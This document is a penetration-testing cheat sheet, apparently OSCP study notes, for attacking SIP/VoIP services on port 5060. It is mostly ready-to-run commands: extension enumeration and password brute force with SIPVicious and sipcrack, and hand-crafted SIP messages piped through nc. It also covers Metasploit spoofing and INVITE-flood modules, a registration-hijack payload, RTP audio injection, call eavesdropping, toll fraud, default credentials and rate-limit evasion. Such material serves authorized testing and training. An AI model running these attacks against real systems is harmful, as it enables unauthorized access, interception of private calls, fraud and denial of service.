# Port 5060 - SIP Enumeration & Exploitation

## Service Information

**Port:** 5060/UDP, 5060/TCP (SIP), 5061/TCP (SIPS - Secure)
**Service:** SIP (Session Initiation Protocol)
**Protocol:** VoIP signaling protocol
**Security:** ⚠️ Often unencrypted, user enumeration, DoS vulnerabilities

---

## 1. Basic Enumeration

### 1.1 Nmap Scan

```bash
# Basic scan (UDP + TCP)
nmap -sU -sT -p 5060 -sV TARGET_IP

# SIP scripts
nmap -sU -p 5060 --script sip-* TARGET_IP

# SIP methods enumeration
nmap -sU -p 5060 --script sip-methods TARGET_IP

# SIP user enumeration
nmap -sU -p 5060 --script sip-enum-users TARGET_IP

# Both SIP and SIPS
nmap -p 5060,5061 -sV -sC TARGET_IP

# UDP scan (SIP primarily uses UDP)
nmap -sU -p 5060,5061 -sV TARGET_IP
```

### 1.2 Banner Grabbing

```bash
# SIP OPTIONS request
echo -e "OPTIONS sip:TARGET_IP SIP/2.0\r\nVia: SIP/2.0/UDP ATTACKER_IP:5060\r\nFrom: <sip:test@ATTACKER_IP>\r\nTo: <sip:TARGET_IP>\r\nCall-ID: test@ATTACKER_IP\r\nCSeq: 1 OPTIONS\r\n\r\n" | nc -u TARGET_IP 5060

# Or use sipvicious tools
svmap TARGET_IP
```

---

## 2. SIPVicious Suite

### 2.1 SIP Server Discovery (svmap)

```bash
# Scan for SIP servers
svmap TARGET_IP

# Scan range
svmap 192.168.1.0/24

# Specific port
svmap TARGET_IP -p 5060

# TCP scan
svmap TARGET_IP --method=tcp
```

### 2.2 SIP Extension Enumeration (svwar)

```bash
# Enumerate extensions/users
svwar -e 100-999 TARGET_IP

# Enumerate with specific range
svwar -e 1000-9999 TARGET_IP

# From file
svwar -e extensions.txt TARGET_IP

# Verbose mode
svwar -v -e 100-500 TARGET_IP

# Output to file
svwar -e 1000-2000 TARGET_IP -o valid_extensions.txt
```

### 2.3 SIP Brute Force (svcrack)

```bash
# Crack extension password
svcrack -u 100 -d wordlist.txt TARGET_IP

# Multiple extensions
svcrack -U extensions.txt -d passwords.txt TARGET_IP

# Verbose
svcrack -v -u 100 -d passwords.txt TARGET_IP
```

---

## 3. Manual SIP Enumeration

### 3.1 SIP OPTIONS Request

```bash
# Check supported methods
sipvicious svmap TARGET_IP

# Manual OPTIONS
cat > options.txt << EOF
OPTIONS sip:TARGET_IP SIP/2.0
Via: SIP/2.0/UDP ATTACKER_IP:5060;branch=z9hG4bK-test
From: <sip:test@ATTACKER_IP>;tag=test
To: <sip:TARGET_IP>
Call-ID: test@ATTACKER_IP
CSeq: 1 OPTIONS
Content-Length: 0

EOF

cat options.txt | nc -u TARGET_IP 5060
```

### 3.2 SIP INVITE Request

```bash
# Send INVITE to test number
cat > invite.txt << EOF
INVITE sip:100@TARGET_IP SIP/2.0
Via: SIP/2.0/UDP ATTACKER_IP:5060;branch=z9hG4bK-test
From: <sip:attacker@ATTACKER_IP>;tag=test123
To: <sip:100@TARGET_IP>
Call-ID: testcall@ATTACKER_IP
CSeq: 1 INVITE
Contact: <sip:attacker@ATTACKER_IP:5060>
Content-Type: application/sdp
Content-Length: 0

EOF

cat invite.txt | nc -u TARGET_IP 5060
```

---

## 4. User/Extension Enumeration

### 4.1 REGISTER Method Enumeration

```bash
# Test if extension exists via REGISTER
# Response codes:
# 401 Unauthorized = Valid extension
# 404 Not Found = Invalid extension

# Using svwar
svwar -m REGISTER -e 100-500 TARGET_IP
```

### 4.2 Timing-Based Enumeration

```bash
# Valid extensions may respond slower
# Invalid extensions respond quickly

# Script to measure timing
for ext in {100..200}; do
  echo "Testing: $ext"
  time svwar -e $ext TARGET_IP
done
```

### 4.3 Common Extension Ranges

```bash
# Common PBX extension ranges:
# 100-999 (3-digit)
# 1000-9999 (4-digit)
# 200-299 (department numbers)
# 300-399 (conference rooms)

# Try common extensions first
svwar -e 100,101,200,300,400,500,1000,2000 TARGET_IP
```

---

## 5. Metasploit Modules

### 5.1 SIP OPTIONS Scanner

```bash
msfconsole
use auxiliary/scanner/sip/options
set RHOSTS TARGET_IP
run
```

### 5.2 SIP REGISTER Username Enumeration

```bash
use auxiliary/scanner/sip/enumerator
set RHOSTS TARGET_IP
set MINEXT 100
set MAXEXT 500
set PADLEN 3
run
```

### 5.3 SIP Invite Spoof

```bash
use auxiliary/voip/sip_invite_spoof
set RHOSTS TARGET_IP
set EXTENSION 100
set SRCADDR SPOOFED_IP
run
```

---

## 6. Exploitation Techniques

### 6.1 SIP Call Interception

```bash
# Sniff SIP traffic (unencrypted)
tcpdump -i eth0 -s0 -A 'udp port 5060'

# Wireshark filter
sip or rtp

# Look for:
# - INVITE messages (call setup)
# - REGISTER (credentials)
# - RTP streams (voice data)
```

### 6.2 SIP Digest Authentication Capture

```bash
# Capture SIP REGISTER with auth
tcpdump -i eth0 -s0 -w sip_capture.pcap 'udp port 5060'

# Extract digest hashes
sipcrack -w wordlist.txt sip_capture.pcap

# Or use Wireshark:
# Statistics -> SIP -> Packet Counter
# Look for Authentication headers
```

### 6.3 RTP Stream Injection

```bash
# After identifying active call (via SIP INVITE):
# 1. Capture RTP stream details (IP, ports, SSRC)
# 2. Inject audio into RTP stream

# Using rtpinsertsound (VoIPHopper toolkit)
rtpinsertsound -i eth0 -s SOURCE_IP -d DEST_IP -p DEST_PORT -f audio.wav
```

---

## 7. Denial of Service Attacks

### 7.1 SIP INVITE Flood

```bash
# Metasploit
use auxiliary/dos/sip/sip_invite_spoof
set RHOSTS TARGET_IP
set NUM 1000
run
```

### 7.2 Registration Hijacking

```bash
# De-register legitimate users
# Send REGISTER with Expires: 0

cat > dereg.txt << EOF
REGISTER sip:TARGET_IP SIP/2.0
Via: SIP/2.0/UDP ATTACKER_IP:5060
From: <sip:100@TARGET_IP>;tag=test
To: <sip:100@TARGET_IP>
Call-ID: test@ATTACKER_IP
CSeq: 1 REGISTER
Contact: <sip:100@ATTACKER_IP>
Expires: 0
Content-Length: 0

EOF

cat dereg.txt | nc -u TARGET_IP 5060
```

---

## 8. VoIP Phone Enumeration

### 8.1 Identify VoIP Phones

```bash
# Nmap OS detection for VoIP devices
nmap -O TARGET_RANGE

# Common VoIP phones:
# - Cisco (SPA, 79xx series)
# - Polycom
# - Yealink
# - Grandstream
# - Aastra

# Check HTTP interface (many phones have web UI)
nmap -p 80,443,8080 TARGET_RANGE
```

### 8.2 Default Credentials

```bash
# Common VoIP phone defaults:
# Cisco: admin/cisco, admin/admin
# Polycom: Polycom/456, admin/admin
# Yealink: admin/admin
# Grandstream: admin/admin

# Try via HTTP
curl -u admin:admin http://TARGET_IP/
```

---

## 9. Common Vulnerabilities

### 9.1 CVE-2020-25638 (FreePBX)

```bash
# FreePBX SIP privilege escalation
# Check FreePBX version via web interface
```

### 9.2 CVE-2021-37706 (Asterisk)

```bash
# Asterisk pjsip crash vulnerability
# Check Asterisk version
```

### 9.3 Weak Authentication

```bash
# Many SIP servers have weak/default credentials
# Test common passwords:
# - admin
# - password
# - 1234
# - Extension number (e.g., 100/100)

svcrack -u 100 -d /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt TARGET_IP
```

---

## 10. Post-Exploitation

### 10.1 Call Eavesdropping

```bash
# After finding valid extension:
# 1. Register as that extension
# 2. Intercept calls

# Capture RTP audio
tcpdump -i eth0 -s0 -w rtp.pcap 'udp portrange 10000-20000'

# Convert to audio (using rtpdump/sox)
rtpdump -F payload rtp.pcap > audio.raw
sox -t raw -r 8000 -e signed -b 16 -c 1 audio.raw audio.wav
```

### 10.2 Toll Fraud

```bash
# If you can authenticate as valid extension:
# Make unauthorized calls (if PSTN gateway is open)

# INVITE to external number
INVITE sip:+1234567890@TARGET_IP SIP/2.0
...
```

---

## 11. Defense Evasion

### 11.1 Slow Enumeration

```bash
# Avoid rate limiting
svwar -e 100-500 TARGET_IP --delay 2

# Random delays
for ext in {100..200}; do
  svwar -e $ext TARGET_IP
  sleep $((RANDOM % 10 + 1))
done
```

### 11.2 Legitimate User-Agent

```bash
# Use common SIP User-Agents
# - Cisco IP Phone
# - Polycom
# - X-Lite

# Modify svwar/sipvicious to use legitimate UA
```

---

## 12. Tools Overview

| Tool | Purpose | Command |
|------|---------|---------|
| sipvicious (svmap) | SIP server discovery | `svmap TARGET_IP` |
| sipvicious (svwar) | Extension enumeration | `svwar -e 100-999 TARGET_IP` |
| sipvicious (svcrack) | Password cracking | `svcrack -u 100 -d pass.txt TARGET` |
| Nmap | Service detection | `nmap -sU -p 5060 --script sip-* TARGET` |
| Metasploit | Enumeration/DoS | `use auxiliary/scanner/sip/options` |
| sipcrack | Digest hash cracking | `sipcrack -w wordlist.txt capture.pcap` |
| Wireshark | Traffic analysis | Filter: `sip or rtp` |

---

## 13. Quick Reference

### Quick Enumeration
```bash
# Discover SIP server
svmap TARGET_IP

# Enumerate extensions
svwar -e 100-500 TARGET_IP

# Nmap scan
nmap -sU -p 5060 --script sip-methods,sip-enum-users TARGET_IP
```

### Quick Brute Force
```bash
# Crack extension password
svcrack -u 100 -d /usr/share/wordlists/rockyou.txt TARGET_IP

# Multiple extensions
svcrack -U extensions.txt -d passwords.txt TARGET_IP
```

### Quick Packet Capture
```bash
# Capture SIP/RTP
tcpdump -i eth0 -s0 -w voip.pcap 'udp port 5060 or udp portrange 10000-20000'

# Wireshark analysis
wireshark voip.pcap
# Filter: sip or rtp
```

---

## 14. OSCP Tips

⚠️ **SIP Priority for OSCP:**
- Less common but HIGH impact when present
- User enumeration is easy (svwar)
- Weak/default passwords common
- Check web interfaces on VoIP phones (port 80)
- Credentials might work on SSH/other services
- Look for Asterisk/FreePBX (port 80/443)

**Common OSCP scenarios:**
1. SIP on 5060 → Enumerate extensions → Weak passwords → Admin access
2. VoIP phone (port 80) → Default credentials → Network access
3. Asterisk/FreePBX → Default admin → System access
4. SIP enumeration → Password reuse on SSH/SMB

**Quick Win Checklist:**
```bash
# 1. Discover SIP
svmap TARGET_IP

# 2. Enumerate extensions
svwar -e 100-200 TARGET_IP

# 3. Try default/weak passwords
svcrack -u 100 -d passwords.txt TARGET_IP

# 4. Check web interface
curl http://TARGET_IP/
```

---

## 15. Common SIP Response Codes

| Code | Meaning | Significance |
|------|---------|--------------|
| 100 | Trying | Call processing |
| 180 | Ringing | Valid extension |
| 200 | OK | Successful |
| 401 | Unauthorized | Valid user, needs auth |
| 403 | Forbidden | Access denied |
| 404 | Not Found | Invalid extension |
| 407 | Proxy Auth Required | Proxy authentication |
| 486 | Busy Here | User busy |

---

## 16. Resources

- **HackTricks VoIP/SIP**: https://book.hacktricks.xyz/network-services-pentesting/pentesting-voip
- **SIPVicious**: https://github.com/EnableSecurity/sipvicious
- **RFC 3261 (SIP)**: https://tools.ietf.org/html/rfc3261
- **VoIP Security Tools**: https://www.voipsa.org/Resources/tools.php
